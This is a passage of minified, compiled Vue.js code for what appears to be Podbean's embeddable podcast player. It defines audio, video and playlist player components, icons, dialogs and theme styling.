                children: ["playToggle", "currentTimeDisplay", "progressControl", "remainingTimeDisplay"]
              },
              bigPlayButton: !1,
              loadingSpinner: !1,
              sources: [{
                src: this.episode.resource,
                type: this.episode.resourceMimetype
              }]
            };
          }
        }),
        data: function () {
          return {
            enableDraw: !1,
            replayTimer: null,
            isShowShareDialog: !1,
            isShowPodcastAppsDialog: !1,
            isShowChaptersDialog: !1
          };
        },
        watch: {
          skin: function () {},
          btnSkin: function () {}
        },
        methods: {
          chapterGoTo: function (t) {
            this.isShowChaptersDialog = !1, this.$refs.pbPlayer.setCurrentTime(t);
          },
          ready: function () {
            this.episode.enableWave && jt();
          },
          pause: function () {},
          play: function () {},
          seekBackward: function () {
            this.$refs.pbPlayer.addCurrentTime(-15);
          },
          seekForward: function () {
            this.$refs.pbPlayer.addCurrentTime(15);
          }
        }
      },
      Na = Ha,
      Ua = (a("8186"), Object(Xt["a"])(Na, c, l, !1, null, null, null)),
      Fa = Ua.exports,
      Va = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("div", {
          staticClass: "pb-audio-player-square row no-gutters"
        }, [a("div", {
          staticClass: "main col min-w-0 p-0",
          style: {
            background: "url(" + t.logo + ") center center / cover no-repeat fixed"
          }
        }, [a("div", {
          staticClass: "top-line"
        }), a("div", {
          staticClass: "top-content"
        }, [a("div", {
          staticClass: "row no-gutters top-title-logo"
        }, [a("div", {
          staticClass: "col min-w-0"
        }, [a("h3", {
          staticClass: "channel-name"
        }, [a("a", {
          attrs: {
            target: t.setting.podcastLink ? "_blank" : "_self",
            href: t.setting.podcastLink || "javascript:void();"
          }
        }, [t._v(t._s(t.setting.podcastTitle))])])]), t.setting.pbad ? a("div", {
          staticClass: "col-auto pb-brand-small-logo pr-2"
        }, [a("a", {
          staticClass: "logo",
          attrs: {
            target: "_blank",
            href: "http://www.podbean.com?utm_campaign=pb_web_audio_square_player&utm_medium=logo&utm_source=pb_web_player",
            title: "Podbean"
          }
        }, [a("icon-podbean-logo")], 1)]) : t._e()]), a("div", {
          staticClass: "row no-gutters"
        }, [a("div", {
          staticClass: "col min-w-0"
        }, [a("h2", {
          staticClass: "episode-name"
        }, [a("a", {
          attrs: {
            target: t.logoUrl ? "_blank" : "_self",
            href: t.logoUrl || "javascript:void();"
          }
        }, [t._v(t._s(t.episode.title))])])]), a("div", {
          staticClass: "col-auto pb-actions pr-2"
        }, [t.podcastApps.length > 0 ? a("a", {
          staticClass: "downloadLink",
          attrs: {
            href: "javascript:;",
            title: "Podcast Apps"
          },
          on: {
            click: function (e) {
              t.isShowPodcastAppsDialog = !0;
            }
          }
        }, [a("icon-rss")], 1) : t._e(), t.download && t.episode.downloadLink ? a("a", {
          staticClass: "downloadLink",
          attrs: {
            target: "_blank",
            href: t.episode.downloadLink,
            title: "Download"
          }
        }, [a("icon-download")], 1) : t._e(), t.share && t.episode.shareLink ? a("a", {
          staticClass: "share",
          attrs: {
            href: "javascript:;",
            title: "Share"
          },
          on: {
            click: function (e) {
              t.isShowShareDialog = !0;
            }
          }
        }, [a("icon-share")], 1) : t._e(), t.chapters.length > 0 ? a("div", {
          staticClass: "chapters"
        }, [a("a", {
          attrs: {
            href: "javascript:;",
            title: "Chapter"
          },
          on: {
            click: function (e) {
              t.isShowChaptersDialog = !0;
            }
          }
        }, [a("icon-list-chapers")], 1)]) : t._e()])])]), a("div", {
          staticClass: "bottom-content"
        }, [a("div", {
          staticClass: "pb-internal-player"
        }, [a("pb-player", {
          ref: "pbPlayer",
          attrs: {
            options: t.videoOptions,
            type: t.episode.type,
            startAt: t.startAt,
            episode: t.episode,
            crossorigin: t.episode.crossorigin
          },
          on: {
            pause: t.pause,
            play: t.play,
            ready: t.ready
          }
        }), a("player-toolbar", {
          on: {
            seekBackward: t.seekBackward,
            seekForward: t.seekForward
          }
        }), a("player-loading")], 1), a("canvas", {
          ref: "canvas",
          attrs: {
            id: "wave-canvas"
          }
        })]), a("app-download-square", {
          directives: [{
            name: "show",
            rawName: "v-show",
            value: 1 === t.showAppDownloadStatus,
            expression: "showAppDownloadStatus === 1"
          }],
          staticClass: "text-center"
        }), t.share && t.episode.shareLink ? a("share-dialog", {
          directives: [{
            name: "show",
            rawName: "v-show",
            value: t.isShowShareDialog,
            expression: "isShowShareDialog"
          }],
          on: {
            hide: function (e) {
              t.isShowShareDialog = !1;
            }
          }
        }) : t._e(), a("podcast-apps-dialog", {
          directives: [{
            name: "show",
            rawName: "v-show",
            value: t.isShowPodcastAppsDialog,
            expression: "isShowPodcastAppsDialog"
          }],
          on: {
            hide: function (e) {
              t.isShowPodcastAppsDialog = !1;
            }
          }
        }), a("chapters-list-dialog", {
          directives: [{
            name: "show",
            rawName: "v-show",
            value: t.isShowChaptersDialog,
            expression: "isShowChaptersDialog"
          }],
          on: {
            "seek-to-chapter-time": t.chapterGoTo,
            hide: function (e) {
              t.isShowChaptersDialog = !1;
            }
          }
        })], 1)]);
      },
      Wa = [],
      Ga = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("div", {
          staticClass: "download-dialog common-dialog"
        }, [a("div", {
          staticClass: "dialog-content"
        }, [a("div", {
          staticClass: "text-content"
        }, [a("p", {
          staticClass: "text text-app"
        }, [t._v("Play the podcast on Podbean")]), a("p", {
          staticClass: "title"
        }, [t._v(t._s(t.setting.podcastTitle))])]), a("div", {
          staticClass: "app-download"
        }, [a("a", {
          staticClass: "download-app-btn",
          attrs: {
            href: t.episode.playStopShareLink,
            target: "_blank"
          }
        }, [a("icon-small-podbean-logo"), a("span", {
          staticClass: "line"
        }), t._m(0)], 1)])]), t.setting.pbad ? a("a", {
          staticClass: "podbean-logo",
          attrs: {
            href: "http://www.podbean.com?utm_campaign=pb_web_audio_player&utm_medium=app_download&utm_source=pb_web_player",
            target: "_blank"
          }
        }, [a("icon-podbean-logo")], 1) : t._e(), a("button", {
          staticClass: "close",
          on: {
            click: t.close
          }
        }, [a("icon-close")], 1)]);
      },
      Ka = [function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("span", {
          staticClass: "btn-text"
        }, [t._v("Listen on "), a("br"), t._v(" Podbean app")]);
      }],
      Ja = {
        name: "AppDownloadSquare",
        components: {
          IconSmallPodbeanLogo: we,
          IconPodbeanLogo: ue,
          IconClose: se
        },
        computed: Object(i["a"])(Object(i["a"])({}, Object(d["b"])(["episode"])), Object(d["c"])(["setting"])),
        methods: {
          close: function () {
            this.$store.commit(b, ["showAppDownloadStatus", 2]);
          }
        }
      },
      Xa = Ja,
      Ya = (a("e8c8"), Object(Xt["a"])(Xa, Ga, Ka, !1, null, "7780a5f5", null)),
      Qa = Ya.exports,
      Za = {
        name: "AudioPlayerSquare",
        components: {
          IconListChapers: qa,
          ChaptersListDialog: Ma,
          PodcastAppsDialog: Ea,
          IconRss: Ca,
          PlayerLoading: ga,
          PlayerToolbar: Qe,
          IconPodbeanLogo: ue,
          IconShare: da,
          IconDownload: na,
          ShareDialog: We,
          AppDownloadSquare: Qa,
          PbPlayer: Qt
        },
        computed: Object(i["a"])(Object(i["a"])(Object(i["a"])({}, Object(d["c"])(["setting", "startAt", "download", "share", "logoLink", "showAppDownloadStatus", "podcastApps", "chapters"])), Object(d["b"])(["episode"])), {}, {
          logoUrl: function () {
            return "episode_page" == this.logoLink ? this.episode.link : "podcast_page" == this.logoLink ? this.setting.podcastLink : "";
          },
          videoOptions: function () {
            return {
              language: "en",
              autoplay: !1,
              controls: !0,
              controlBar: {
                fullscreenToggle: !1,
                durationDisplay: !1,
                mouseTimeDisplay: !1,
                children: ["playToggle", "currentTimeDisplay", "progressControl", "remainingTimeDisplay"]
              },
              loadingSpinner: !1,
              bigPlayButton: !1,
              sources: [{
                src: this.episode.resource,
                type: this.episode.resourceMimetype
              }]
            };
          }
        }),
        data: function () {
          return {
            timer: null,
            isShowShareDialog: !1,
            isShowPodcastAppsDialog: !1,
            logo: "",
            isShowChaptersDialog: !1
          };
        },
        mounted: function () {
          var t = this,
            e = this.episode.logo;
          this.logo = e;
          var a = new Image();
          a.src = this.episode.largeLogo, a.onload = function () {
            t.logo === e && (t.logo = a.src);
          };
        },
        methods: {
          chapterGoTo: function (t) {
            this.isShowChaptersDialog = !1, this.$refs.pbPlayer.setCurrentTime(t);
          },
          ready: function () {
            this.episode.enableWave && jt();
          },
          pause: function () {},
          play: function () {},
          seekBackward: function () {
            this.$refs.pbPlayer.addCurrentTime(-15);
          },
          seekForward: function () {
            this.$refs.pbPlayer.addCurrentTime(15);
          }
        }
      },
      to = Za,
      eo = (a("05a9"), Object(Xt["a"])(to, Va, Wa, !1, null, null, null)),
      ao = eo.exports,
      oo = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("div", {
          staticClass: "pb-video-player row no-gutters",
          class: {
            showPlaySwitchEffect: t.showPlaySwitchEffect
          }
        }, [a("div", {
          staticClass: "main col min-w-0 p-0"
        }, [a("div", {
          ref: "topContent",
          staticClass: "video-top-content",
          staticStyle: {
            display: "none"
          }
        }, [a("h2", {
          staticClass: "episode-name"
        }, [a("a", {
          attrs: {
            target: t.episode.link ? "_blank" : "_self",
            href: t.episode.link || "javascript:void();"
          }
        }, [t._v(t._s(t.episode.title))])]), a("div", {
          staticClass: "pb-actions"
        }, [t.podcastApps.length > 0 ? a("a", {
          staticClass: "subscribe",
          attrs: {
            href: "javascript:;",
            title: "Podcast Apps"
          },
          on: {
            click: function (e) {
              t.isShowPodcastAppsDialog = !0;
            }
          }
        }, [a("icon-rss")], 1) : t._e(), t.download && t.episode.downloadLink ? a("a", {
          staticClass: "downloadLink",
          attrs: {
            target: "_blank",
            href: t.episode.downloadLink,
            title: "Download"
          }
        }, [a("icon-download")], 1) : t._e(), t.share && t.episode.shareLink ? a("a", {
          staticClass: "share",
          attrs: {
            href: "javascript:;",
            title: "Share"
          },
          on: {
            click: function (e) {
              t.isShowShareDialog = !0;
            }
          }
        }, [a("icon-share")], 1) : t._e()])]), a("div", {
          ref: "empty",
          staticClass: "video-empty"
        }), a("div", {
          ref: "podbeanLogo",
          staticClass: "podbean-logo row no-gutters",
          staticStyle: {
            display: "none"
          }
        }, [t.setting.pbad ? a("div", {
          staticClass: "col-auto pb-brand-small-logo"
        }, [a("a", {
          staticClass: "logo",
          attrs: {
            target: "_blank",
            href: "http://www.podbean.com?utm_campaign=pb_web_video_player&utm_medium=logo&utm_source=pb_web_player",
            title: "Podbean"
          }
        }, [a("icon-podbean-logo")], 1)]) : t._e()]), a("div", {
          staticClass: "pb-internal-player"
        }, [a("pb-player", {
          ref: "pbPlayer",
          attrs: {
            options: t.videoOptions,
            type: t.episode.type,
            startAt: t.startAt,
            episode: t.episode,
            crossorigin: t.episode.crossorigin
          },
          on: {
            ready: t.playerReady
          }
        }), a("player-loading")], 1), a("app-download", {
          directives: [{
            name: "show",
            rawName: "v-show",
            value: 1 === t.showAppDownloadStatus,
            expression: "showAppDownloadStatus === 1"
          }],
          staticClass: "text-left"
        }), a("div", {
          ref: "playSwitchEffect",
          staticClass: "video-play-paused-bg"
        }, [a("icon-pause", {
          staticClass: "text-white"
        }), a("icon-play", {
          staticClass: "text-white"
        })], 1)], 1), t.share && t.episode.shareLink ? a("share-dialog", {
          directives: [{
            name: "show",
            rawName: "v-show",
            value: t.isShowShareDialog,
            expression: "isShowShareDialog"
          }],
          on: {
            hide: function (e) {
              t.isShowShareDialog = !1;
            }
          }
        }) : t._e(), a("podcast-apps-dialog", {
          directives: [{
            name: "show",
            rawName: "v-show",
            value: t.isShowPodcastAppsDialog,
            expression: "isShowPodcastAppsDialog"
          }],
          on: {
            hide: function (e) {
              t.isShowPodcastAppsDialog = !1;
            }
          }
        })], 1);
      },
      no = [],
      ro = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("svg", {
          staticClass: "bi bi-pause-fill",
          attrs: {
            xmlns: "http://www.w3.org/2000/svg",
            width: "16",
            height: "16",
            fill: "currentColor",
            viewBox: "0 0 16 16"
          }
        }, [a("path", {
          attrs: {
            d: "M5.5 3.5A1.5 1.5 0 0 1 7 5v6a1.5 1.5 0 0 1-3 0V5a1.5 1.5 0 0 1 1.5-1.5zm5 0A1.5 1.5 0 0 1 12 5v6a1.5 1.5 0 0 1-3 0V5a1.5 1.5 0 0 1 1.5-1.5z"
          }
        })]);
      },
      so = [],
      io = {
        name: "IconPause"
      },
      co = io,
      lo = Object(Xt["a"])(co, ro, so, !1, null, null, null),
      po = lo.exports,
      uo = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("svg", {
          staticClass: "bi bi-play-fill",
          attrs: {
            xmlns: "http://www.w3.org/2000/svg",
            width: "16",
            height: "16",
            fill: "currentColor",
            viewBox: "0 0 16 16"
          }
        }, [a("path", {
          attrs: {
            d: "m11.596 8.697-6.363 3.692c-.54.313-1.233-.066-1.233-.697V4.308c0-.63.692-1.01 1.233-.696l6.363 3.692a.802.802 0 0 1 0 1.393z"
          }
        })]);
      },
      ho = [],
      fo = {
        name: "IconPlay"
      },
      mo = fo,
      go = Object(Xt["a"])(mo, uo, ho, !1, null, null, null),
      vo = go.exports,
      wo = {
        name: "VideoPlayer",
        components: {
          IconRss: Ca,
          PodcastAppsDialog: Ea,
          PlayerLoading: ga,
          IconPodbeanLogo: ue,
          IconShare: da,
          IconDownload: na,
          ShareDialog: We,
          AppDownload: Ce,
          PbPlayer: Qt,
          IconPause: po,
          IconPlay: vo
        },
        mounted: function () {
          var t = document.createElement("div");
          t.classList.add("bg-mask");
          var e = document.createElement("div");
          e.style.backgroundImage = "url(".concat(this.episode.logo, ")"), e.classList.add("logo-background"), t.appendChild(e), this.$refs.pbPlayer.player.addChild("DomRef", {
            dom: t
          });
        },
        watch: {
          download: function () {
            var t = this;
            return Object(s["a"])(regeneratorRuntime.mark(function e() {
              return regeneratorRuntime.wrap(function (e) {
                while (1) switch (e.prev = e.next) {
                  case 0:
                    return e.next = 2, t.$nextTick();
                  case 2:
                    t.playerReady();
                  case 3:
                  case "end":
                    return e.stop();
                }
              }, e);
            }))();
          },
          episode: function () {
            var t = this;
            return Object(s["a"])(regeneratorRuntime.mark(function e() {
              return regeneratorRuntime.wrap(function (e) {
                while (1) switch (e.prev = e.next) {
                  case 0:
                    return e.next = 2, t.$nextTick();
                  case 2:
                    t.playerReady();
                  case 3:
                  case "end":
                    return e.stop();
                }
              }, e);
            }))();
          },
          share: function () {
            var t = this;
            return Object(s["a"])(regeneratorRuntime.mark(function e() {
              return regeneratorRuntime.wrap(function (e) {
                while (1) switch (e.prev = e.next) {
                  case 0:
                    return e.next = 2, t.$nextTick();
                  case 2:
                    t.playerReady();
                  case 3:
                  case "end":
                    return e.stop();
                }
              }, e);
            }))();
          },
          playerPlaying: function () {
            var t = this;
            return Object(s["a"])(regeneratorRuntime.mark(function e() {
              var a;
              return regeneratorRuntime.wrap(function (e) {
                while (1) switch (e.prev = e.next) {
                  case 0:
                    return t.showPlaySwitchEffect = !1, e.next = 3, Et(100);
                  case 3:
                    return t.showPlaySwitchEffect = !0, a = Mt(), t.globalGuid = a, e.next = 8, Et(400);
                  case 8:
                    a === t.globalGuid && (t.showPlaySwitchEffect = !1);
                  case 9:
                  case "end":
                    return e.stop();
                }
              }, e);
            }))();
          }
        },
        computed: Object(i["a"])(Object(i["a"])(Object(i["a"])({}, Object(d["c"])(["setting", "startAt", "download", "share", "showAppDownloadStatus", "podcastApps", "playerPlaying"])), Object(d["b"])(["episode"])), {}, {
          videoOptions: function () {
            return {
              language: "en",
              poster: this.episode.largeLogo,
              autoplay: !1,
              controls: !0,
              controlBar: {
                fullscreenToggle: !0,
                durationDisplay: !1,
                mouseTimeDisplay: !1,
                children: ["playToggle", "currentTimeDisplay", "progressControl", "remainingTimeDisplay", "playbackRateMenuButton"]
              },
              playbackRates: [.75, 1, 1.25, 1.5, 2],
              bigPlayButton: !0,
              sources: [{
                src: this.episode.resource,
                type: this.episode.resourceMimetype
              }]
            };
          }
        }),
        data: function () {
          return {
            timer: null,
            isShowShareDialog: !1,
            isShowPodcastAppsDialog: !1,
            showPlaySwitchEffect: !1,
            globalGuid: null
          };
        },
        beforeDestroy: function () {
          clearInterval(this.timer);
        },
        methods: {
          playerReady: function () {
            var t = this;
            return Object(s["a"])(regeneratorRuntime.mark(function e() {
              var a, o, n, r, s, i, c;
              return regeneratorRuntime.wrap(function (e) {
                while (1) switch (e.prev = e.next) {
                  case 0:
                    return a = t.$refs.pbPlayer.player.el().querySelector(".video-top-content"), a && a.remove(), a = t.$refs.pbPlayer.player.el().querySelector(".podbean-logo"), a && a.remove(), o = t.$refs.topContent.cloneNode(!0), n = t.$refs.playSwitchEffect.cloneNode(!0), r = t.$refs.empty.cloneNode(!0), s = t.$refs.podbeanLogo.cloneNode(!0), t.$refs.pbPlayer.player.addChild("DomRef", {
                      dom: o
                    }), t.$refs.pbPlayer.player.addChild("DomRef", {
                      dom: n
                    }), t.$refs.pbPlayer.player.controlBar.addChild("DomRef", {
                      dom: s
                    }), t.$refs.pbPlayer.player.controlBar.addChild("DomRef", {
                      dom: r
                    }), e.next = 14, t.$nextTick();
                  case 14:
                    r.style.display = "block", o.style.display = "block", s.style.display = "block", i = o.querySelector(".share"), i && (i.onclick = function () {
                      t.isShowShareDialog = !0;
                    }), c = o.querySelector(".subscribe"), c && (c.onclick = function () {
                      t.isShowPodcastAppsDialog = !0;
                    });
                  case 21:
                  case "end":
                    return e.stop();
                }
              }, e);
            }))();
          }
        }
      },
      bo = wo,
      yo = (a("9596"), Object(Xt["a"])(bo, oo, no, !1, null, null, null)),
      ko = yo.exports,
      Co = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("ul", {
          staticClass: "player-list",
          class: {
            playerPause: !t.playing
          }
        }, t._l(t.episodes, function (e, o) {
          return a("li", {
            key: e.id,
            class: {
              active: t.$store.state.current === o
            },
            on: {
              click: function (e) {
                return t.playEpisode(o, e);
              }
            }
          }, [a("a", {
            attrs: {
              href: "javascript:;"
            }
          }, [t.$store.state.current === o && t.playing ? a("svg", {
            staticClass: "bi bi-pause-fill",
            attrs: {
              xmlns: "http://www.w3.org/2000/svg",
              width: "16",
              height: "16",
              fill: "currentColor",
              viewBox: "0 0 16 16"
            }
          }, [a("path", {
            attrs: {
              d: "M5.5 3.5A1.5 1.5 0 0 1 7 5v6a1.5 1.5 0 0 1-3 0V5a1.5 1.5 0 0 1 1.5-1.5zm5 0A1.5 1.5 0 0 1 12 5v6a1.5 1.5 0 0 1-3 0V5a1.5 1.5 0 0 1 1.5-1.5z"
            }
          })]) : a("svg", {
            staticClass: "bi bi-play-fill play-icon",
            attrs: {
              xmlns: "http://www.w3.org/2000/svg",
              width: "16",
              height: "16",
              fill: "currentColor",
              viewBox: "0 0 16 16"
            }
          }, [a("path", {
            attrs: {
              d: "M11.596 8.697l-6.363 3.692c-.54.313-1.233-.066-1.233-.697V4.308c0-.63.692-1.01 1.233-.696l6.363 3.692a.802.802 0 0 1 0 1.393z"
            }
          })])]), a("a", {
            staticClass: "episode-title",
            attrs: {
              href: "javascript:;"
            }
          }, [t._v(t._s(e.title))]), a("span", {
            staticClass: "time"
          }, [t._v(t._s(e.duration))]), t.download && e.downloadLink ? a("a", {
            staticClass: "downloadLink",
            attrs: {
              target: "_blank",
              href: e.downloadLink
            }
          }, [a("icon-download")], 1) : t._e()]);
        }), 0);
      },
      _o = [],
      xo = {
        name: "Playlist",
        components: {
          IconDownload: na
        },
        computed: Object(i["a"])({}, Object(d["c"])(["episodes", "current", "download", "playing"])),
        methods: {
          playEpisode: function (t, e) {
            var a = this;
            return Object(s["a"])(regeneratorRuntime.mark(function o() {
              return regeneratorRuntime.wrap(function (o) {
                while (1) switch (o.prev = o.next) {
                  case 0:
                    if ("svg" !== e.target.tagName.toLowerCase()) {
                      o.next = 2;
                      break;
                    }
                    return o.abrupt("return");
                  case 2:
                    if (a.current !== t) {
                      o.next = 5;
                      break;
                    }
                    return a.playing ? a.$store.commit(b, ["stop", a.$store.state.stop + 1]) : a.$store.commit(b, ["start", a.$store.state.start + 1]), o.abrupt("return");
                  case 5:
                    return a.$store.commit(b, ["current", t]), o.next = 8, Et(500);
                  case 8:
                    a.$store.commit(b, ["start", a.$store.state.start + 1]), a.$store.commit(b, ["playerLoaded", !1]), 1 === a.$store.state.showAppDownloadStatus && a.$store.commit(b, ["showAppDownloadStatus", 2]);
                  case 11:
                  case "end":
                    return o.stop();
                }
              }, o);
            }))();
          }
        }
      },
      Po = xo,
      So = (a("9f07"), Object(Xt["a"])(Po, Co, _o, !1, null, "00b476c0", null)),
      Oo = So.exports,
      Eo = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("div", {
          staticClass: "pb-audio-player row no-gutters mini-audio-player"
        }, [a("div", {
          staticClass: "main col min-w-0 p-0"
        }, [a("div", {
          staticClass: "pb-internal-player"
        }, [a("pb-player", {
          ref: "pbPlayer",
          attrs: {
            options: t.videoOptions,
            type: t.episode.type,
            startAt: t.startAt,
            episode: t.episode,
            crossorigin: null
          },
          on: {
            pause: t.pause,
            play: t.play,
            ready: t.ready
          }
        }), a("player-loading")], 1)])]);
      },
      To = [],
      jo = {
        name: "AudioPlayerMini",
        components: {
          PlayerLoading: ga,
          PbPlayer: Qt
        },
        computed: Object(i["a"])(Object(i["a"])(Object(i["a"])({}, Object(d["c"])(["setting", "startAt", "miniOnlyPlay"])), Object(d["b"])(["episode"])), {}, {
          videoOptions: function () {
            var t = {
              fullscreenToggle: !1,
              durationDisplay: !1,
              mouseTimeDisplay: !1,
              children: ["playToggle", "currentTimeDisplay", "progressControl", "remainingTimeDisplay"]
            };
            return this.miniOnlyPlay && (t = {
              fullscreenToggle: !1,
              durationDisplay: !1,
              mouseTimeDisplay: !1,
              children: ["playToggle"]
            }), {
              language: "en",
              autoplay: !1,
              controls: !0,
              controlBar: t,
              bigPlayButton: !1,
              loadingSpinner: !1,
              sources: [{
                src: this.episode.resource,
                type: this.episode.resourceMimetype
              }]
            };
          }
        }),
        data: function () {
          return {
            enableDraw: !1,
            replayTimer: null,
            isShowShareDialog: !1,
            isShowPodcastAppsDialog: !1
          };
        },
        watch: {
          skin: function () {},
          btnSkin: function () {}
        },
        methods: {
          ready: function () {
            this.episode.enableWave && jt();
          },
          pause: function () {},
          play: function () {},
          seekBackward: function () {
            this.$refs.pbPlayer.addCurrentTime(-15);
          },
          seekForward: function () {
            this.$refs.pbPlayer.addCurrentTime(15);
          }
        }
      },
      Lo = jo,
      Ao = (a("9d1b"), Object(Xt["a"])(Lo, Eo, To, !1, null, null, null)),
      Do = Ao.exports,
      Mo = {
        name: "App",
        components: {
          AudioPlayerMini: Do,
          Playlist: Oo,
          VideoPlayer: ko,
          AudioPlayerSquare: ao,
          AudioPlayer: Fa
        },
        data: function () {
          return {
            loadingFinished: !1,
            styleCSS: ".min-w-0 {min-width: 0;}.pb-audio-player{background-color: var(--player-color);}.video-js {.vjs-time-control {span {color: var(--font-color) !important;opacity: 0.5;}}}.player-double-speed {button {svg {path {fill: var(--font-color);opacity: 0.5;}}}.double-speed {color: var(--font-color);}}.pb-actions {a , a:hover{color: var(--font-color);}}.top-title-logo {.pb-brand-small-logo {a{.icon-podbean-logo{color:var(--font-color)!important;opacity:0.8;}} }}.episode-name, .channel-name {color: var(--font-color);}.episode-name a,.channel-name a {color: var(--font-color);}.episode-name a:hover, .channel-name a:hover {color: var(--font-color);}.vjs-play-control {color: var(--player-btn-color);}.vjs-big-play-button {border: 0.06666em solid var(--player-btn-color) !important;}.pb-video-player {.vjs-icon-placeholder {&:before {color: var(--player-btn-color);}}}.player-loading {.item {background: var(--player-btn-color) !important;}}.vjs-play-control, .vjs-progress-control .vjs-play-progress, .top-line {background-color: var(--player-btn-color) !important;}.vjs-load-progress {div {background: var(--player-btn-color) !important;opacity: 0.25;}}.player-list {li.active {.episode-title, .play-icon, .bi-pause-fill {color: var(--player-btn-color) !important;}}li {&:hover {.episode-title, .play-icon, .bi-pause-fill {color: var(--player-btn-color) !important;}}}}"
          };
        },
        computed: Object(i["a"])(Object(i["a"])(Object(i["a"])({}, Object(d["c"])(["setting", "square", "mini", "error", "rtl", "fonts", "skin", "btnSkin", "playerError", "playerLoading", "playerLoaded", "playerPlaying", "playerColor", "playerBtnColor", "fontColor", "errorLogo", "errorLoginUrl", "customCssLink", "customCss", "cssVersion"])), Object(d["b"])(["episode"])), {}, {
          css2: function () {
            return null !== this.customCss ? "<style>".concat(this.customCss, "</style>") : "";
          }
        }),
        mounted: function () {
          var t = this;
          return Object(s["a"])(regeneratorRuntime.mark(function e() {
            return regeneratorRuntime.wrap(function (e) {
              while (1) switch (e.prev = e.next) {
                case 0:
                  t.$store.dispatch(k);
                case 1:
                case "end":
                  return e.stop();
              }
            }, e);
          }))();
        },
        watch: {
          playerColor: function () {
            if (this.playerColor) {
              var t = document.querySelector(":root");
              t.style.setProperty("--player-color", this.playerColor), this.initStyle();
            }
          },
          playerBtnColor: function () {
            if (this.playerBtnColor) {
              var t = document.querySelector(":root");
              t.style.setProperty("--player-btn-color", this.playerBtnColor), this.initStyle();
            }
          },
          fontColor: function () {
            if (this.fontColor) {
              var t = document.querySelector(":root");
              t.style.setProperty("--font-color", this.fontColor), this.initStyle();
            }
          }
        },
        methods: {
          initStyle: function () {
            if (Ft()) {
              var t = document.createElement("style"),
                e = this.styleCSS;
              e = e.replace(/var\(--font-color\)/g, this.fontColor).replace(/var\(--player-btn-color\)/g, this.playerBtnColor).replace(/var\(--player-color\)/g, this.playerColor), e += ".pb-actions a, .pb-actions a:hover{color: " + this.fontColor + " !important;}", e += ".vjs-text-track-cue div{color: " + this.fontColor + " !important;}", t.innerText = e;
              var a = document.getElementsByTagName("head")[0];
              a.appendChild(t);
            }
          },
          openLoginWindow: function () {
            window.reloginFinished = function () {
              window.location.reload();
            }, Vt(this.errorLoginUrl);
          },
          getCustomCssLink: function () {
            return this.customCssLink + "?v=" + this.cssVersion;
          }
        }
      },
      Ro = Mo,
      $o = (a("5c0b"), Object(Xt["a"])(Ro, n, r, !1, null, null, null)),
      Io = $o.exports,
      Bo = (a("fda2"), a("a65d")),
      zo = a.n(Bo),
      qo = (a("2b8e"), a("0953"), a("4eb5")),
      Ho = a.n(qo),
      No = a("bd8c"),
      Uo = a.n(No),
      Fo = ["https://d8g345wuhgd7e.cloudfront.net/site/css/admin5/iconfont/iconfont.css"];
    Fo.forEach(function (t) {
      Rt(t);
    }), o["a"].config.productionTip = !1, window.HELP_IMPROVE_VIDEOJS = !1, console.log = function () {}, console.error = function () {}, console.warn = function () {}, window.onunhandledrejection = function (t) {
      t.preventDefault();
    }, window.onerror = function (t) {
      console.log(t);
    }, o["a"].use(Ho.a), o["a"].use(zo.a), o["a"].filter("formatDuration", Wt), o["a"].use(Uo.a), new o["a"]({
      render: function (t) {
        return t(Io);
      },
      store: J
    }).$mount("#app");
  },
  "5a17": function (t, e, a) {
    "use strict";

    a("8a53");
  },
  "5ac6": function (t, e, a) {
    "use strict";

    a("c13f");
  },
  "5c0b": function (t, e, a) {
    "use strict";

    a("9c0c");
  },
  "5fc9": function (t, e, a) {},
  6175: function (t, e, a) {},
  7299: function (t, e, a) {},
  8186: function (t, e, a) {
    "use strict";

    a("94f8");
  },
  "8a53": function (t, e, a) {},
  "94f8": function (t, e, a) {},
  9596: function (t, e, a) {
    "use strict";

    a("3daf");
  },
  "95a8": function (t, e, a) {
    "use strict";

    a("f8b8");
  },
  "9c0c": function (t, e, a) {},
  "9d1b": function (t, e, a) {
    "use strict";

    a("5fc9");
  },
  "9f07": function (t, e, a) {
    "use strict";

    a("0143");
  },
  c13f: function (t, e, a) {},
  e8c8: function (t, e, a) {
    "use strict";

    a("7299");
  },
  e9d8: function (t, e, a) {
    "use strict";

    a("0d4e");
  },
  f8b8: function (t, e, a) {},
  fda5: function (t, e, a) {
    "use strict";

    a("30fd");
  }
});